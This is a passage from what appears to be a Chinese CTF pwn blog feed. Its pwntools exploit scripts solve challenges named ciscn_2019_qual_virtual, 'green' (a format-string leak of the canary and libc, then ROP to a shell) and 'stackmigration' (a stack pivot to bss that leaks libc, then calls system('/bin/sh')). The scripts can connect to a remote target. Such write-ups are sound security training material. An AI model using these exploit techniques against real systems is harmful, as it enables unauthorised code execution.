punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>EXP</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Your program name:'</span><span class="token punctuation">,</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>instruction <span class="token operator">=</span> <span class="token string">'push push save push load push add push save'</span>sla<span class="token punctuation">(</span><span class="token string">'Your instruction:'</span><span class="token punctuation">,</span>instruction<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x0000000000401D98\n')</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x00000000004014A0\n'</span><span class="token punctuation">)</span>puts_got<span class="token operator">=</span>eg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>stack<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x404100</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x1c</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x2a300</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>stack<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x1c</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Your stack data:'</span><span class="token punctuation">,</span>stack<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h","-l 150"]</span>binary<span class="token operator">=</span><span class="token string">'./ciscn_2019_qual_virtual'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六届金盾信安杯初赛2024</title>
      <link href="/2024/12/01/%E7%AC%AC%E5%85%AD%E5%B1%8A%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9B2024/"/>
      <url>/2024/12/01/%E7%AC%AC%E5%85%AD%E5%B1%8A%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9B2024/</url>
      
        <content type="html"><![CDATA[<h1 id="green"><a href="#green" class="headerlink" title="green"></a>green</h1><p>直接两个裸溢出，格式化字符串泄露canary和libc，然后直接走rop即可<br><img src="/EXP_FILE/8a89141e28cf39459be2df0feb35a2e0_MD5.jpeg"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#dbg('b *$rebase(0x0000132A)')</span>sla<span class="token punctuation">(</span><span class="token string">'Every protection is enabled. Good luck.'</span><span class="token punctuation">,</span><span class="token string">b'%15$p.%16$p'</span><span class="token punctuation">)</span><span class="token comment">#本地</span>ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>canary<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>stdout<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>stdout<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x00001363)'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">12</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>system<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>binsh<span class="token punctuation">]</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./green'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="stackmigration"><a href="#stackmigration" class="headerlink" title="stackmigration"></a>stackmigration</h1><p>溢出了0x10字节，栈劫持到bss上走rop泄露libc，然后再劫持一次走system</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">'Give you a gift:0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leak<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>read_leave_ret<span class="token operator">=</span><span class="token number">0x000000000040087F</span>leave_ret<span class="token operator">=</span><span class="token number">0x0000000000400896</span>bss<span class="token operator">=</span><span class="token number">0x601000</span><span class="token operator">+</span><span class="token number">0x200</span>bss1<span class="token operator">=</span><span class="token number">0x601000</span><span class="token operator">+</span><span class="token number">0x400</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Do you still have something to say?'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#----------------leak libc</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000400963</span>payload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>eg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ep<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bss1<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>libc<span class="token operator">=</span>puts<span class="token operator">-</span><span class="token number">0x000000000006F6A0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">)</span><span class="token comment">#---------------</span>system<span class="token operator">=</span><span class="token number">0x00000000000453A0</span><span class="token operator">+</span>libcbinsh<span class="token operator">=</span><span class="token number">0x000000000018ce57</span><span class="token operator">+</span>libcpayload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss1<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x0000000000400897'</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>rop<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./stackmigration'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span 